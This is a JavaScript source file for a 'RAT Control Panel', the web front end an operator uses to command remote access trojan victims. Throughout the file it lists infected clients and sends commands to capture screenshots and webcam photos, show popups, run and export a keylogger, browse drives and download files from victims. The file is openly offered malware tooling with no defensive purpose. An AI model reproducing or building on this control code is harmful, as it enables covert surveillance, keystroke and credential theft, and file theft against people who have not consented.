// RAT Control Panel JavaScript

// Global variables
let socket;
let connectedClients = {};
let selectedClient = null;

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    initializeWebSocket();
    initializeEventHandlers();
    updateUIState();
});

// WebSocket initialization
function initializeWebSocket() {
    socket = io();
    
    socket.on('connect', function() {
        console.log('Connected to server');
        updateConnectionStatus('Connected', 'success');
        addLogEntry('Connected to RAT Web Interface', 'success');
    });
    
    socket.on('disconnect', function() {
        console.log('Disconnected from server');
        updateConnectionStatus('Disconnected', 'warning');
        addLogEntry('Disconnected from RAT Web Interface', 'warning');
    });
    
    socket.on('server_status', function(data) {
        if (data.status === 'running') {
            updateServerStatus('Running', 'success');
            addLogEntry(`Server started on ${data.host}:${data.port}`, 'success');
        } else if (data.status === 'error') {
            updateServerStatus('Error', 'danger');
            addLogEntry(`Server error: ${data.message}`, 'error');
        }
    });
    
    socket.on('client_connected', function(data) {
        addClient(data);
        addLogEntry(`Client connected: ${data.client_id}`, 'info');
    });
    
    socket.on('client_disconnected', function(data) {
        removeClient(data.client_id);
        addLogEntry(`Client disconnected: ${data.client_id}`, 'warning');
    });
    
    socket.on('client_heartbeat', function(data) {
        updateClientHeartbeat(data.client_id);
    });
    
    socket.on('screenshot_received', function(data) {
        addScreenshot(data);
        addLogEntry(`Screenshot received from ${data.client_id}`, 'success');
    });
    
    socket.on('photo_received', function(data) {
        addPhoto(data);
        addLogEntry(`Photo received from ${data.client_id}`, 'success');
    });
    
    socket.on('keylog_data', function(data) {
        addKeylogData(data);
    });
    
    socket.on('keylog_status', function(data) {
        updateKeylogStatus(data);
        addLogEntry(`Keylogger ${data.payload.status} for ${data.client_id}`, 'info');
    });
    
    socket.on('file_list', function(data) {
        displayFileList(data);
    });
    
    socket.on('file_download', function(data) {
        handleFileDownload(data);
    });
    
    socket.on('file_info', function(data) {
        showFileInfo(data);
    });
    
    socket.on('drives_list', function(data) {
        showDrivesList(data);
    });
    
    socket.on('popup_response', function(data) {
        addLogEntry(`Popup response from ${data.client_id}: ${JSON.stringify(data.response)}`, 'info');
    });
    
    socket.on('client_error', function(data) {
        addLogEntry(`Client error from ${data.client_id}: ${data.error}`, 'error');
    });
    
    socket.on('error', function(data) {
        addLogEntry(`Error: ${data.message}`, 'error');
    });
}

// Initialize event handlers
function initializeEventHandlers() {
    // Server control
    document.getElementById('start-server').addEventListener('click', startServer);
    
    // Command buttons
    document.getElementById('cmd-screenshot').addEventListener('click', sendScreenshotCommand);
    document.getElementById('cmd-photo').addEventListener('click', sendPhotoCommand);
    document.getElementById('cmd-popup').addEventListener('click', showPopupConfig);
    document.getElementById('cmd-keylog-start').addEventListener('click', sendKeylogStartCommand);
    document.getElementById('cmd-keylog-stop').addEventListener('click', sendKeylogStopCommand);
    document.getElementById('cmd-file-browser').addEventListener('click', openFileBrowser);
    document.getElementById('cmd-ping').addEventListener('click', sendPingCommand);
    document.getElementById('send-popup').addEventListener('click', sendPopupCommand);
    
    // Client selection
    document.getElementById('target-client').addEventListener('change', function() {
        selectedClient = this.value;
        updateCommandButtons();
    });
    
    // Clear log
    document.getElementById('clear-log').addEventListener('click', clearActivityLog);
    
    // Keylogger controls
    document.getElementById('clear-keylog').addEventListener('click', clearKeylogData);
    document.getElementById('export-keylog').addEventListener('click', exportKeylogData);
    
    // File browser controls
    document.getElementById('refresh-files').addEventListener('click', refreshCurrentDirectory);
    document.getElementById('get-drives').addEventListener('click', getDrivesList);
    document.getElementById('go-up').addEventListener('click', goToParentDirectory);
    document.getElementById('navigate-to-path').addEventListener('click', navigateToPath);
    
    // Refresh clients periodically
    setInterval(refreshClients, 5000);
}

// Server control functions
function startServer() {
    const host = document.getElementById('server-host').value;
    const port = document.getElementById('server-port').value;
    
    fetch('/api/server/start', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ host: host, port: parseInt(port) })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            addLogEntry(data.message, 'success');
            document.getElementById('start-server').disabled = true;
        } else {
            addLogEntry(data.message, 'error');
        }
    })
    .catch(error => {
        addLogEntry(`Error starting server: ${error}`, 'error');
    });
}

// Client management functions
function addClient(clientData) {
    connectedClients[clientData.client_id] = clientData;
    updateClientsList();
    updateTargetClientSelect();
}

function removeClient(clientId) {
    delete connectedClients[clientId];
    updateClientsList();
    updateTargetClientSelect();
    
    // Clear selection if removed client was selected
    if (selectedClient === clientId) {
        selectedClient = null;
        document.getElementById('target-client').value = '';
        updateCommandButtons();
    }
}

function updateClientHeartbeat(clientId) {
    if (connectedClients[clientId]) {
        connectedClients[clientId].lastHeartbeat = Date.now();
    }
}

function updateClientsList() {
    const clientsList = document.getElementById('clients-list');
    
    if (Object.keys(connectedClients).length === 0) {
        clientsList.innerHTML = '<p class="text-muted">No clients connected</p>';
        return;
    }
    
    let html = '';
    for (const [clientId, client] of Object.entries(connectedClients)) {
        const isActive = client.lastHeartbeat && (Date.now() - client.lastHeartbeat < 30000);
        html += `
            <div class="client-item ${isActive ? '' : 'disconnected'}" data-client-id="${clientId}">
                <div class="client-id">${clientId}</div>
                <div class="client-info">
                    IP: ${client.ip} | Port: ${client.port}
                    ${isActive ? '<span class="status-online">●</span>' : '<span class="status-offline">●</span>'}
                </div>
            </div>
        `;
    }
    clientsList.innerHTML = html;
}

function updateTargetClientSelect() {
    const select = document.getElementById('target-client');
    const currentValue = select.value;
    
    // Clear options except first
    select.innerHTML = '<option value="">Select a client...</option>';
    
    // Add client options
    for (const [clientId, client] of Object.entries(connectedClients)) {
        const option = document.createElement('option');
        option.value = clientId;
        option.textContent = `${clientId} (${client.ip})`;
        select.appendChild(option);
    }
    
    // Restore selection if still valid
    if (currentValue && connectedClients[currentValue]) {
        select.value = currentValue;
        selectedClient = currentValue;
    }
    
    updateCommandButtons();
}

function refreshClients() {
    fetch('/api/clients')
        .then(response => response.json())
        .then(clients => {
            // Update client status
            for (const client of clients) {
                if (connectedClients[client.id]) {
                    connectedClients[client.id].connected = client.connected;
                }
            }
            updateClientsList();
        })
        .catch(error => {
            console.error('Error refreshing clients:', error);
        });
}

// Command functions
function updateCommandButtons() {
    const hasClient = selectedClient && connectedClients[selectedClient];
    document.getElementById('cmd-screenshot').disabled = !hasClient;
    document.getElementById('cmd-photo').disabled = !hasClient;
    document.getElementById('cmd-popup').disabled = !hasClient;
    document.getElementById('cmd-keylog-start').disabled = !hasClient;
    document.getElementById('cmd-keylog-stop').disabled = !hasClient;
    document.getElementById('cmd-file-browser').disabled = !hasClient;
    document.getElementById('cmd-ping').disabled = !hasClient;
}

function sendScreenshotCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/screenshot', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending screenshot command: ${error}`, 'error');
    });
}

function sendPhotoCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending photo command: ${error}`, 'error');
    });
}

function showPopupConfig() {
    const config = document.getElementById('popup-config');
    config.style.display = config.style.display === 'none' ? 'block' : 'none';
}

function sendPopupCommand() {
    if (!selectedClient) return;
    
    const title = document.getElementById('popup-title').value;
    const message = document.getElementById('popup-message').value;
    const type = document.getElementById('popup-type').value;
    
    fetch('/api/command/popup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            client_id: selectedClient,
            title: title,
            message: message,
            type: type
        })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
        // Hide config after sending
        document.getElementById('popup-config').style.display = 'none';
    })
    .catch(error => {
        addLogEntry(`Error sending popup command: ${error}`, 'error');
    });
}

function sendKeylogStartCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/keylog_start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending keylog start command: ${error}`, 'error');
    });
}

function sendKeylogStopCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/keylog_stop', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending keylog stop command: ${error}`, 'error');
    });
}

function sendPingCommand() {
    if (!selectedClient) return;
    
    fetch('/api/command/ping', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error sending ping command: ${error}`, 'error');
    });
}

// Screenshot functions
function addScreenshot(data) {
    const container = document.getElementById('screenshots-container');
    
    // Remove "no screenshots" message
    if (container.querySelector('p.text-muted')) {
        container.innerHTML = '';
    }
    
    const timestamp = new Date(data.timestamp * 1000).toLocaleString();
    
    const screenshotHtml = `
        <div class="col-md-4 screenshot-item fade-in">
            <div class="card">
                <img src="${data.url}" class="screenshot-thumbnail" 
                     onclick="showScreenshotModal('${data.url}', '${data.filename}')"
                     alt="Screenshot from ${data.client_id}">
                <div class="screenshot-info">
                    <strong>Client:</strong> ${data.client_id}<br>
                    <strong>Time:</strong> ${timestamp}
                </div>
            </div>
        </div>
    `;
    
    container.insertAdjacentHTML('afterbegin', screenshotHtml);
}

function showScreenshotModal(url, filename) {
    document.getElementById('modal-screenshot').src = url;
    document.getElementById('download-screenshot').href = url;
    document.getElementById('download-screenshot').download = filename;
    
    const modal = new bootstrap.Modal(document.getElementById('screenshotModal'));
    modal.show();
}

// Photo functions
function addPhoto(data) {
    const container = document.getElementById('photos-container');
    
    // Remove "no photos" message
    if (container.querySelector('p.text-muted')) {
        container.innerHTML = '';
    }
    
    const timestamp = new Date(data.timestamp * 1000).toLocaleString();
    
    const photoHtml = `
        <div class="col-md-6 screenshot-item fade-in">
            <div class="card">
                <img src="${data.url}" class="screenshot-thumbnail" 
                     onclick="showPhotoModal('${data.url}', '${data.filename}')"
                     alt="Photo from ${data.client_id}">
                <div class="screenshot-info">
                    <strong>Client:</strong> ${data.client_id}<br>
                    <strong>Time:</strong> ${timestamp}
                </div>
            </div>
        </div>
    `;
    
    container.insertAdjacentHTML('afterbegin', photoHtml);
}

function showPhotoModal(url, filename) {
    document.getElementById('modal-photo').src = url;
    document.getElementById('download-photo').href = url;
    document.getElementById('download-photo').download = filename;
    
    const modal = new bootstrap.Modal(document.getElementById('photoModal'));
    modal.show();
}

// Activity log functions
function addLogEntry(message, type = 'info') {
    const log = document.getElementById('activity-log');
    const timestamp = new Date().toLocaleTimeString();
    
    // Remove initial message
    if (log.querySelector('p.text-muted')) {
        log.innerHTML = '';
    }
    
    const entry = document.createElement('div');
    entry.className = `log-entry log-${type}`;
    entry.innerHTML = `
        <span class="log-time">[${timestamp}]</span> ${message}
    `;
    
    log.insertBefore(entry, log.firstChild);
    
    // Limit log entries
    const entries = log.querySelectorAll('.log-entry');
    if (entries.length > 100) {
        entries[entries.length - 1].remove();
    }
}

function clearActivityLog() {
    document.getElementById('activity-log').innerHTML = 
        '<p class="text-muted">Activity log cleared...</p>';
}

// UI update functions
function updateServerStatus(status, type) {
    const badge = document.getElementById('server-status');
    badge.textContent = `Server ${status}`;
    badge.className = `badge bg-${type} me-2`;
}

function updateConnectionStatus(status, type) {
    const badge = document.getElementById('connection-status');
    badge.textContent = status;
    badge.className = `badge bg-${type}`;
}

function updateUIState() {
    updateCommandButtons();
}

// Utility functions
function formatTime(timestamp) {
    return new Date(timestamp).toLocaleString();
}

function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
}

// Keylogger functions
function addKeylogData(data) {
    const container = document.getElementById('keylog-container');
    
    // Remove "no data" message
    if (container.querySelector('p.text-muted')) {
        container.innerHTML = '';
    }
    
    const timestamp = new Date(data.payload.timestamp * 1000).toLocaleString();
    const keylogData = escapeHtml(data.payload.data);
    
    const entry = document.createElement('div');
    entry.className = 'keylog-entry';
    entry.innerHTML = `
        <div class="keylog-header">
            <strong>Client:</strong> ${data.client_id} | 
            <strong>Time:</strong> ${timestamp}
        </div>
        <div class="keylog-data">${keylogData.replace(/\n/g, '<br>')}</div>
        <hr>
    `;
    
    container.appendChild(entry);
    
    // Auto-scroll to bottom
    container.scrollTop = container.scrollHeight;
    
    addLogEntry(`Keylog data received from ${data.client_id}`, 'info');
}

function updateKeylogStatus(data) {
    const statusBadge = document.getElementById('keylog-status');
    const status = data.payload.status;
    
    if (status === 'started') {
        statusBadge.textContent = 'Running';
        statusBadge.className = 'badge bg-success me-2';
        
        // Enable stop button, disable start button
        document.getElementById('cmd-keylog-start').disabled = true;
        document.getElementById('cmd-keylog-stop').disabled = false;
    } else if (status === 'stopped') {
        statusBadge.textContent = 'Stopped';
        statusBadge.className = 'badge bg-secondary me-2';
        
        // Enable start button, disable stop button  
        document.getElementById('cmd-keylog-start').disabled = false;
        document.getElementById('cmd-keylog-stop').disabled = true;
    } else {
        statusBadge.textContent = 'Not Running';
        statusBadge.className = 'badge bg-secondary me-2';
        
        // Reset button states
        updateCommandButtons();
    }
}

function clearKeylogData() {
    const container = document.getElementById('keylog-container');
    container.innerHTML = '<p class="text-muted">Keylogger data will appear here when started...</p>';
    addLogEntry('Keylog data cleared', 'info');
}

function exportKeylogData() {
    const container = document.getElementById('keylog-container');
    const entries = container.querySelectorAll('.keylog-entry');
    
    if (entries.length === 0) {
        addLogEntry('No keylog data to export', 'warning');
        return;
    }
    
    let exportData = 'RAT Keylogger Export\n';
    exportData += '===================\n\n';
    
    entries.forEach(entry => {
        const header = entry.querySelector('.keylog-header').textContent;
        const data = entry.querySelector('.keylog-data').textContent;
        exportData += header + '\n';
        exportData += data + '\n\n';
    });
    
    // Create and download file
    const blob = new Blob([exportData], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `keylog_export_${new Date().toISOString().slice(0, 19).replace(/:/g, '-')}.txt`;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
    
    addLogEntry('Keylog data exported', 'success');
}

// File Browser functions
let currentPath = '';

function openFileBrowser() {
    if (!selectedClient) return;
    
    // Request file list for current directory
    fetch('/api/command/file_list', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            client_id: selectedClient,
            path: null  // Start with current directory
        })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error opening file browser: ${error}`, 'error');
    });
}

function displayFileList(data) {
    const container = document.getElementById('file-browser-container');
    const currentPathInput = document.getElementById('current-path');
    
    if (!data.payload.success) {
        container.innerHTML = `
            <div class="alert alert-danger">
                <i class="fas fa-exclamation-triangle"></i>
                Error: ${data.payload.error}
            </div>
        `;
        return;
    }
    
    currentPath = data.payload.path;
    currentPathInput.value = currentPath;
    
    let html = '<div class="file-list">';
    
    if (data.payload.items.length === 0) {
        html += '<div class="text-center text-muted py-3">Directory is empty</div>';
    } else {
        data.payload.items.forEach(item => {
            const iconClass = getFileIcon(item.type);
            const sizeText = item.type === 'directory' ? '' : `(${item.size_formatted})`;
            
            html += `
                <div class="file-item d-flex align-items-center p-2 border-bottom" 
                     data-path="${escapeHtml(item.path)}" 
                     data-type="${item.type}">
                    <i class="${iconClass} me-2"></i>
                    <div class="flex-grow-1">
                        <div class="file-name">${escapeHtml(item.name)} ${sizeText}</div>
                        <small class="text-muted">Modified: ${new Date(item.modified).toLocaleString()}</small>
                    </div>
                    <div class="file-actions">
                        ${item.type === 'directory' ? 
                            '<button class="btn btn-sm btn-outline-primary open-dir">Open</button>' :
                            `<button class="btn btn-sm btn-outline-info file-info">Info</button>
                             ${item.permissions.readable ? '<button class="btn btn-sm btn-outline-success download-file">Download</button>' : ''}`
                        }
                    </div>
                </div>
            `;
        });
    }
    
    html += '</div>';
    container.innerHTML = html;
    
    // Add event listeners
    container.querySelectorAll('.open-dir').forEach(btn => {
        btn.addEventListener('click', function() {
            const fileItem = this.closest('.file-item');
            const path = fileItem.dataset.path;
            navigateToDirectory(path);
        });
    });
    
    container.querySelectorAll('.file-info').forEach(btn => {
        btn.addEventListener('click', function() {
            const fileItem = this.closest('.file-item');
            const path = fileItem.dataset.path;
            getFileInfo(path);
        });
    });
    
    container.querySelectorAll('.download-file').forEach(btn => {
        btn.addEventListener('click', function() {
            const fileItem = this.closest('.file-item');
            const path = fileItem.dataset.path;
            downloadFile(path);
        });
    });
    
    addLogEntry(`Directory loaded: ${data.payload.total_items} items`, 'info');
}

function getFileIcon(type) {
    switch(type) {
        case 'directory': return 'fas fa-folder text-warning';
        case 'file': return 'fas fa-file text-primary';
        case 'error': return 'fas fa-exclamation-triangle text-danger';
        default: return 'fas fa-question text-muted';
    }
}

function navigateToDirectory(path) {
    if (!selectedClient) return;
    
    fetch('/api/command/file_list', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            client_id: selectedClient,
            path: path
        })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error navigating to directory: ${error}`, 'error');
    });
}

function refreshCurrentDirectory() {
    if (currentPath) {
        navigateToDirectory(currentPath);
    } else {
        openFileBrowser();
    }
}

function goToParentDirectory() {
    // This would be handled by the backend based on current path
    navigateToDirectory('..');
}

function navigateToPath() {
    const pathInput = document.getElementById('current-path');
    const path = pathInput.value.trim();
    if (path) {
        navigateToDirectory(path);
    }
}

function getFileInfo(filePath) {
    if (!selectedClient) return;
    
    fetch('/api/command/file_info', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            client_id: selectedClient,
            file_path: filePath
        })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error getting file info: ${error}`, 'error');
    });
}

function downloadFile(filePath) {
    if (!selectedClient) return;
    
    fetch('/api/command/file_download', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            client_id: selectedClient,
            file_path: filePath
        })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error downloading file: ${error}`, 'error');
    });
}

function handleFileDownload(data) {
    if (!data.payload.success) {
        addLogEntry(`Download failed: ${data.payload.error}`, 'error');
        return;
    }
    
    // Decode base64 data and create download link
    const binaryData = atob(data.payload.data);
    const bytes = new Uint8Array(binaryData.length);
    for (let i = 0; i < binaryData.length; i++) {
        bytes[i] = binaryData.charCodeAt(i);
    }
    
    const blob = new Blob([bytes]);
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = data.payload.filename;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
    
    addLogEntry(`File downloaded: ${data.payload.filename} (${data.payload.size_formatted})`, 'success');
}

function showFileInfo(data) {
    const modal = new bootstrap.Modal(document.getElementById('fileInfoModal'));
    const content = document.getElementById('file-info-content');
    const downloadBtn = document.getElementById('download-file-from-info');
    
    if (!data.payload.success) {
        content.innerHTML = `
            <div class="alert alert-danger">
                <i class="fas fa-exclamation-triangle"></i>
                Error: ${data.payload.error}
            </div>
        `;
        downloadBtn.style.display = 'none';
    } else {
        const info = data.payload;
        content.innerHTML = `
            <table class="table table-sm">
                <tr><th>Name:</th><td>${escapeHtml(info.name)}</td></tr>
                <tr><th>Path:</th><td class="text-break">${escapeHtml(info.path)}</td></tr>
                <tr><th>Type:</th><td>${info.type}</td></tr>
                <tr><th>Size:</th><td>${info.size_formatted}</td></tr>
                <tr><th>Created:</th><td>${new Date(info.created).toLocaleString()}</td></tr>
                <tr><th>Modified:</th><td>${new Date(info.modified).toLocaleString()}</td></tr>
                <tr><th>Accessed:</th><td>${new Date(info.accessed).toLocaleString()}</td></tr>
                <tr><th>Permissions:</th><td>
                    ${info.permissions.readable ? '<span class="badge bg-success">R</span>' : '<span class="badge bg-secondary">R</span>'}
                    ${info.permissions.writable ? '<span class="badge bg-warning">W</span>' : '<span class="badge bg-secondary">W</span>'}
                    ${info.permissions.executable ? '<span class="badge bg-info">X</span>' : '<span class="badge bg-secondary">X</span>'}
                </td></tr>
            </table>
        `;
        
        if (info.is_downloadable) {
            downloadBtn.style.display = 'inline-block';
            downloadBtn.onclick = () => {
                modal.hide();
                downloadFile(info.path);
            };
        } else {
            downloadBtn.style.display = 'none';
        }
    }
    
    modal.show();
}

function getDrivesList() {
    if (!selectedClient) return;
    
    fetch('/api/command/get_drives', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ client_id: selectedClient })
    })
    .then(response => response.json())
    .then(data => {
        addLogEntry(data.message, data.status === 'success' ? 'success' : 'error');
    })
    .catch(error => {
        addLogEntry(`Error getting drives list: ${error}`, 'error');
    });
}

function showDrivesList(data) {
    const modal = new bootstrap.Modal(document.getElementById('drivesModal'));
    const content = document.getElementById('drives-list');
    
    if (!data.payload.success) {
        content.innerHTML = `
            <div class="alert alert-danger">
                <i class="fas fa-exclamation-triangle"></i>
                Error: ${data.payload.error}
            </div>
        `;
    } else {
        let html = '<div class="list-group">';
        
        data.payload.drives.forEach(drive => {
            const accessible = drive.accessible ? 'list-group-item-success' : 'list-group-item-secondary';
            html += `
                <a href="#" class="list-group-item list-group-item-action ${accessible} drive-item" 
                   data-path="${escapeHtml(drive.path)}"
                   ${drive.accessible ? '' : 'style="opacity: 0.6;"'}>
                    <div class="d-flex w-100 justify-content-between align-items-center">
                        <h6 class="mb-1">
                            <i class="fas fa-hard-drive me-2"></i>
                            Drive ${drive.letter}
                        </h6>
                        <small>${drive.accessible ? 'Accessible' : 'Inaccessible'}</small>
                    </div>
                    <p class="mb-1">${escapeHtml(drive.path)}</p>
                </a>
            `;
        });
        
        html += '</div>';
        content.innerHTML = html;
        
        // Add click handlers
        content.querySelectorAll('.drive-item').forEach(item => {
            item.addEventListener('click', function(e) {
                e.preventDefault();
                const path = this.dataset.path;
                modal.hide();
                navigateToDirectory(path);
            });
        });
    }
    
    modal.show();
} 